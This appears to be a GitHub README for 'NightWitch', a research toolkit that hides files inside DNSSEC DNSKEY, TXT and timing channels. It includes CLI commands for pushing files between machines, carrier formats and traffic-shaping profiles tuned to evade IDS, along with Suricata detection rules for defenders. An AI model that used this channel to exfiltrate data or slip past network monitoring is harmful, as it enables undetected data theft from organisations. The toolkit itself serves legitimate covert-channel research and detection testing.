# NightWitch

**A DNSSEC-based Covert Channel Toolkit for Academic Research**

NightWitch is a proof-of-concept toolkit that implements covert communication channels exploiting DNSSEC protocol fields. Designed for academic research and security testing, it demonstrates how DNS traffic can be leveraged for stealth data exfiltration while evading traditional network security controls.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [Scenario Configuration](#scenario-configuration)
  - [LAN Mode](#lan-mode)
  - [WAN Mode with Tailscale](#wan-mode-with-tailscale)
  - [Benchmarking](#benchmarking)
- [Carrier Types](#carrier-types)
- [Security Features](#security-features)
- [IDS Testing](#ids-testing)
- [Project Structure](#project-structure)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Features

- **Multiple DNS Carriers**: Embed data in DNSKEY, TXT records, or timing-based channels
- **Strong Encryption**: AES-256-GCM authenticated encryption with PBKDF2 key derivation
- **Error Correction**: Reed-Solomon encoding for resilience against packet corruption
- **Traffic Shaping**: Statistical mimicry to evade behavioral analysis (Gaussian/Exponential distributions)
- **IDS Evasion Testing**: Built-in Suricata and Zeek integration for detection rate measurement
- **LAN/WAN Support**: Seamless operation across local networks or Internet via Tailscale VPN
- **Comprehensive Benchmarking**: Measure throughput, latency, stealth metrics, and overhead

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           NIGHTWITCH TOOLKIT                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐             │
│   │   SENDER     │    │   CHANNEL    │    │   RECEIVER   │             │
│   │  (Injector)  │───▶│  DNS/DNSSEC  │───▶│  (Extractor) │             │
│   └──────────────┘    │   Port 53    │    └──────────────┘             │
│          │            └──────────────┘           │                      │
│          ▼                   │                   ▼                      │
│   ┌──────────────┐           │            ┌──────────────┐             │
│   │ Encoder      │           │            │ Decoder      │             │
│   │ ┌──────────┐ │           │            │ ┌──────────┐ │             │
│   │ │Compress  │ │           │            │ │Base64    │ │             │
│   │ │Encrypt   │ │           │            │ │Reed-Sol  │ │             │
│   │ │Chunk     │ │           │            │ │CRC Check │ │             │
│   │ │Sequence  │ │      ┌────┴────┐       │ │Decrypt   │ │             │
│   │ │Reed-Sol  │ │      │   IDS   │       │ │Decompress│ │             │
│   │ │Base64    │ │      │ Monitor │       │ └──────────┘ │             │
│   │ └──────────┘ │      └─────────┘       └──────────────┘             │
│   └──────────────┘                                                      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Core Modules

| Module | Description |
|--------|-------------|
| `controller.py` | Central orchestrator for send/receive operations |
| `encoder_decoder.py` | 7-stage encoding pipeline (compress, encrypt, chunk, sequence, Reed-Solomon, Base64) |
| `covert_channel.py` | Carrier type definitions and channel design |
| `traffic_shaper.py` | Statistical traffic mimicry with KS-test validation |
| `zone_manager.py` | DNSSEC zone file management and key generation |
| `ids_tester.py` | Suricata/Zeek integration for detection testing |

---

## Installation

### Prerequisites

- Python 3.10+
- Root/sudo access (required for port 53 binding and interface operations)
- Optional: Tailscale (for WAN mode)
- Optional: Suricata/Zeek (for IDS testing)

### Setup

```bash
# Clone the repository
git clone https://github.com/yourusername/nightwitch.git
cd nightwitch

# Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

---

## Quick Start

### 1. Create a Scenario

```bash
python3 nightwitch.py create-scenario \
  --name test-scenario \
  --domain example.test \
  --carrier dnskey \
  --chunk-size 250 \
  --freq 2s \
  --encrypt aes256 \
  --accept-disclaimer
```

### 2. Start the Receiver

```bash
# On receiver machine
python3 nightwitch.py setup-receiver --sender-ip 192.168.1.10 --accept-disclaimer
python3 nightwitch.py start-receiver --scenario test-scenario --accept-disclaimer
```

### 3. Send a File

```bash
# On sender machine
python3 nightwitch.py setup-sender --receiver-ip 192.168.1.20 --accept-disclaimer
python3 nightwitch.py push --file secret.pdf --scenario test-scenario --accept-disclaimer
```

---

## Usage

### Scenario Configuration

Scenarios define the covert channel parameters:

```bash
python3 nightwitch.py create-scenario \
  --name <scenario-name> \
  --domain <target-domain> \
  --carrier <dnskey|txt|timing> \
  --ttl <dns-ttl-seconds> \
  --chunk-size <bytes> \
  --freq <interval> \
  --encrypt <aes256|aes128|none> \
  --accept-disclaimer
```

| Parameter | Description | Default |
|-----------|-------------|---------|
| `--name` | Unique scenario identifier | required |
| `--domain` | Target DNS domain | example.test |
| `--carrier` | Data carrier type | dnskey |
| `--ttl` | DNS record TTL | 300 |
| `--chunk-size` | Bytes per chunk | 200 |
| `--freq` | Transmission interval | 5s |
| `--encrypt` | Encryption algorithm | aes256 |

### LAN Mode

For local network testing:

```bash
# Receiver (192.168.1.20)
python3 nightwitch.py setup-receiver \
  --sender-ip 192.168.1.10 \
  --interface eth0 \
  --accept-disclaimer

python3 nightwitch.py start-receiver \
  --scenario test-scenario \
  --accept-disclaimer

# Sender (192.168.1.10)
python3 nightwitch.py setup-sender \
  --receiver-ip 192.168.1.20 \
  --interface eth0 \
  --accept-disclaimer

python3 nightwitch.py push \
  --file data.bin \
  --scenario test-scenario \
  --accept-disclaimer
```

### WAN Mode with Tailscale

For Internet-based transmission using Tailscale VPN:

```bash
# Install Tailscale on both machines
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up

# Get Tailscale IPs
ip addr show tailscale0

# Receiver (100.x.x.2)
python3 nightwitch.py setup-receiver \
  --sender-ip 100.x.x.1 \
  --interface tailscale0 \
  --wan \
  --accept-disclaimer

sudo python3 nightwitch.py start-receiver \
  --scenario wan-test \
  --accept-disclaimer

# Sender (100.x.x.1)
python3 nightwitch.py setup-sender \
  --receiver-ip 100.x.x.2 \
  --interface tailscale0 \
  --wan \
  --accept-disclaimer

sudo python3 nightwitch.py push \
  --file secret.pdf \
  --scenario wan-test \
  --accept-disclaimer
```

> **Note**: WAN mode requires `sudo` for interface binding and uses extended timeouts (60s vs 10s for LAN).

### Benchmarking

Run comprehensive performance metrics:

```bash
# Full benchmark suite
python3 scripts/run_benchmark.py --all --verbose

# Individual metrics
python3 scripts/run_benchmark.py --throughput    # Measure Kbps
python3 scripts/run_benchmark.py --latency       # Measure RTT
python3 scripts/run_benchmark.py --stealth       # Entropy + IDS alerts
python3 scripts/run_benchmark.py --overhead      # Transmission ratio

# Custom configuration
python3 scripts/run_benchmark.py \
  --all \
  --test-file myfile.bin \
  --ping-count 100 \
  --output-json results/benchmark.json
```

**Benchmark Metrics:**

| Metric | Description | Typical Values |
|--------|-------------|----------------|
| **Throughput (T)** | Effective data rate | 20-50 Kbps (LAN), 10-30 Kbps (WAN) |
| **Latency (L)** | Round-trip time | 5-50ms (LAN), 50-200ms (WAN) |
| **Stealth (S)** | Shannon entropy + IDS alerts | Entropy: 7.0-8.0, Alerts: 0 |
| **Overhead (O)** | Bytes transmitted / original size | 3-5x |

---

## Carrier Types

### DNSKEY (Recommended)

Embeds data in DNSSEC public key records. High capacity (~2KB per record), excellent stealth as DNSKEY records naturally contain high-entropy Base64 data.

```
example.test. IN DNSKEY 256 3 8 <base64_payload>
```

### TXT

Uses DNS TXT records formatted as SPF/DKIM entries. Limited to 255 bytes per record, moderate stealth level.

```
example.test. IN TXT "v=spf1 include:<base64_payload> ~all"
```

### Timing

Encodes data in inter-query timing intervals. Extremely low capacity (~2 bps) but virtually undetectable through content analysis.

```
Bit 0 = 100ms delay
Bit 1 = 500ms delay
```

---

## Security Features

### Encryption Pipeline

1. **Compression**: zlib DEFLATE (level 6)
2. **Encryption**: AES-256-GCM (authenticated encryption)
3. **Key Derivation**: PBKDF2-HMAC-SHA256 (100,000 iterations)
4. **Error Correction**: Reed-Solomon (10 ECC symbols per chunk)
5. **Integrity**: CRC32 per chunk + AES-GCM authentication tag

### Traffic Shaping Profiles

| Profile | Description | Use Case |
|---------|-------------|----------|
| `normal` | Gaussian distribution, 20% variance | Standard operation |
| `stealth` | 2x interval, 10% variance | High-security environments |
| `bursty` | Exponential distribution, 50% variance | Mimics web browsing |

---

## IDS Testing

### Suricata Integration

Generate and test detection rules:

```bash
# Start Suricata monitoring
sudo suricata -c /etc/suricata/suricata.yaml \
  -i eth0 \
  -S config/suricata_rules/covert_channel.rules \
  -l /var/log/suricata/

# Run IDS evasion test
python3 nightwitch.py ids-test \
  --scenario test-scenario \
  --duration 60 \
  --accept-disclaimer

# Analyze results
jq 'select(.alert)' /var/log/suricata/eve.json
```

### Included Detection Rules

| SID | Detection Method |
|-----|------------------|
| 1000001 | High-entropy DNS queries |
| 1000002 | Anomalous DNSKEY size |
| 1000003 | DNS query frequency threshold |
| 1000004 | Base64 pattern in queries |
| 1000005 | Sequential DNSKEY requests |
| 1000006 | Large TXT record responses |

---

## Project Structure

```
nightwitch/
├── nightwitch.py              # Main CLI entry point
├── requirements.txt           # Python dependencies
├── src/
│   ├── controller.py          # Core orchestration
│   ├── encoder_decoder.py     # Encoding/decoding pipeline
│   ├── covert_channel.py      # Channel design
│   ├── traffic_shaper.py      # Traffic mimicry
│   ├── zone_manager.py        # DNSSEC zone management
│   ├── ids_tester.py          # IDS integration
│   ├── lan_ids_tester.py      # LAN-specific testing
│   └── ...
├── config/
│   ├── suricata_rules/        # Detection rules
│   └── zeek_scripts/          # Zeek analysis scripts
├── scripts/
│   ├── run_benchmark.py       # Benchmarking suite
│   └── ...
├── scenarios/                 # Saved scenario configs
├── zones/                     # DNSSEC zone files
├── results/                   # Benchmark outputs
└── received_data/             # Received file storage
```

---

## Disclaimer

**This toolkit is intended solely for authorized security research, academic study, and controlled testing environments.**

By using this software, you acknowledge that:

1. You will only use this toolkit on networks and systems you own or have explicit written permission to test
2. Unauthorized interception or exfiltration of data is illegal in most jurisdictions
3. The authors assume no liability for misuse of this software
4. This is a proof-of-concept for educational purposes demonstrating covert channel techniques

**All commands require the `--accept-disclaimer` flag to confirm ethical usage.**

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---
